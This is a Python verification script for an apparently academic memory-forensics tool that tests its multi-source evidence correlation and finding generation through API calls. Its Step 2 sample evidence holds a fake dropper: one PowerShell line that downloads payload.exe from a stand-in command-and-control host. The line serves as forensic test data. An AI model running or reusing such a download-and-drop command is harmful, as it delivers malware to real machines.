"""
ForensiX AI - Phase 5 Multi-Evidence Correlation Verification Script
Verifies multi-source evidence correlation, sliding-window temporal clustering,
confidence scoring, and forensic finding synthesis.
"""

import io
import json
import os
import sys
from pathlib import Path

# Add project root to sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from datetime import datetime, timezone, timedelta
from fastapi.testclient import TestClient

from backend.app.main import app


def run_phase5_verification():
    print("=" * 65)
    print("ForensiX AI: Phase 5 Multi-Evidence Correlation Verification")
    print("Official Academic Title:")
    print("Memory Forensics for Volatile Data Analysis via Deep Learning-based")
    print("Deleted File and Timestamp Reconstruction, Applied to Cloud...")
    print("=" * 65)

    with TestClient(app) as client:
        # Step 1: Create Case
        print("\n[Step 1] Creating Forensic Investigation Case...")
        case_payload = {
            "name": "Phase 5 Multi-Source Evidence Correlation Verification",
            "description": "Cross-analyzing filesystem timestamps, volatile memory traces, and event logs.",
            "investigator": "A. Abhiram",
            "status": "Analyzing",
        }
        case_res = client.post("/api/v1/cases", json=case_payload)
        assert case_res.status_code == 201, f"Case creation failed: {case_res.text}"
        case_data = case_res.json()
        case_id = case_data["id"]
        case_number = case_data["case_number"]
        print(f"  ✓ Case Created: {case_number} (ID: {case_id})")

        # Step 2: Upload Evidence Item 1 (Script / Dropper)
        print("\n[Step 2] Uploading Evidence #1 (Executable Script / Dropper)...")
        script_content = b'# Malicious Dropper Payload\nInvoke-RestMethod -Uri "https://c2.telemetry-sync.org/agent" -OutFile "C:\\Windows\\Temp\\payload.exe"\n'
        evi1_res = client.post(
            f"/api/v1/cases/{case_id}/evidence",
            files={"file": ("stage1_dropper.ps1", io.BytesIO(script_content), "text/plain")},
            data={"file_type": "File"},
        )
        assert evi1_res.status_code == 201
        evi1 = evi1_res.json()
        print(f"  ✓ Evidence #1: {evi1['filename']} ({evi1['readable_size']}) - SHA256: {evi1['sha256'][:16]}...")

        # Step 3: Upload Evidence Item 2 (System Log)
        print("\n[Step 3] Uploading Evidence #2 (Windows Security Event Log)...")
        log_content = json.dumps([
            {"EventID": 4688, "TimeCreated": "2026-11-14T10:03:40Z", "ProcessName": "powershell.exe", "Parent": "explorer.exe"},
            {"EventID": 5156, "TimeCreated": "2026-11-14T10:04:12Z", "DestinationAddress": "198.51.100.45", "Port": 443}
        ]).encode("utf-8")
        evi2_res = client.post(
            f"/api/v1/cases/{case_id}/evidence",
            files={"file": ("security_event_log.json", io.BytesIO(log_content), "application/json")},
            data={"file_type": "System Log"},
        )
        assert evi2_res.status_code == 201
        evi2 = evi2_res.json()
        print(f"  ✓ Evidence #2: {evi2['filename']} ({evi2['readable_size']}) - SHA256: {evi2['sha256'][:16]}...")

        # Step 4: Inject Correlated Volatile Memory & Network Events
        print("\n[Step 4] Injecting Correlated Timeline Events across sources...")
        t_cluster = datetime.now(timezone.utc) - timedelta(minutes=15)

        event_definitions = [
            {
                "timestamp": t_cluster,
                "event_type": "Process Started",
                "source": "Volatility 3 (windows.pslist)",
                "evidence_id": evi2["id"],
                "desc": "Process powershell.exe execution detected (PID: 3840)",
                "category": "Memory Image",
            },
            {
                "timestamp": t_cluster + timedelta(seconds=3),
                "event_type": "Network Activity",
                "source": "Volatility 3 (windows.netscan)",
                "evidence_id": evi2["id"],
                "desc": "TCP outbound connection established to 198.51.100.45:443",
                "category": "Network Evidence",
            },
            {
                "timestamp": t_cluster + timedelta(seconds=7),
                "event_type": "File Modified",
                "source": "Filesystem MACB ($FILE_MODIFY)",
                "evidence_id": evi1["id"],
                "desc": "Observed filesystem modification of stage1_dropper.ps1",
                "category": "File",
            },
        ]

        for ed in event_definitions:
            ev_res = client.post(
                "/api/v1/timeline/events",
                json={
                    "case_id": case_id,
                    "evidence_id": ed["evidence_id"],
                    "timestamp": ed["timestamp"].isoformat(),
                    "timestamp_source": ed["source"],
                    "event_type": ed["event_type"],
                    "artifact_category": ed["category"],
                    "description": ed["desc"],
                    "confidence": 0.95,
                    "classification": "OBSERVED",
                },
            )
            assert ev_res.status_code == 201

        print(f"  ✓ Successfully registered 3 interdependent events spanning a 7-second window.")

        # Step 5: Execute Correlation Engine
        print("\n[Step 5] Executing Multi-Evidence Correlation Engine (Window: 30s)...")
        corr_res = client.post(
            f"/api/v1/cases/{case_id}/correlate",
            json={"time_window_seconds": 30, "min_cluster_size": 2, "generate_findings": True},
        )
        assert corr_res.status_code == 200
        corr = corr_res.json()

        print(f"  ✓ Total Events Analyzed: {corr['total_events_analyzed']}")
        print(f"  ✓ Clusters Identified: {corr['total_clusters']}")
        print(f"  ✓ Multi-Source Corroborations: {corr['multi_source_correlations_count']}")
        print(f"  ✓ Findings Synthesized: {corr['findings_generated_count']}")

        # Step 6: Verify Cluster Contents
        print("\n[Step 6] Inspecting Correlated Clusters...")
        for c in corr["clusters"]:
            print(f"  • Cluster: {c['cluster_id']} | Classification: [{c['cluster_classification']}] | Confidence: {int(c['confidence']*100)}%")
            print(f"    Summary: {c['summary']}")
            print(f"    Sources: {', '.join(c['evidence_filenames'])}")
            print("    Sequential Chain:")
            for ev in c["events"]:
                print(f"      + {ev['time_delta_seconds']:4.1f}s | {ev['event_type']:<18} | {ev['evidence_filename']}")

        # Step 7: Verify Findings Register
        print("\n[Step 7] Inspecting Forensic Findings Register...")
        findings_res = client.get(f"/api/v1/cases/{case_id}/findings")
        assert findings_res.status_code == 200
        findings = findings_res.json()
        assert len(findings) >= 1
        for f in findings:
            print(f"  • Finding: {f['title']}")
            print(f"    Classification: [{f['classification']}] | Severity: {f['severity']} | Confidence: {int(f['confidence']*100)}%")
            print(f"    Reason: {f['reason']}")
            print(f"    Explanation: {f['explanation']}")
            print(f"    Recommendation: {f['recommendation']}")

        print("\n" + "=" * 65)
        print("✓ PHASE 5 MULTI-EVIDENCE CORRELATION VERIFIED SUCCESSFULLY!")
        print("=" * 65)


if __name__ == "__main__":
    run_phase5_verification()
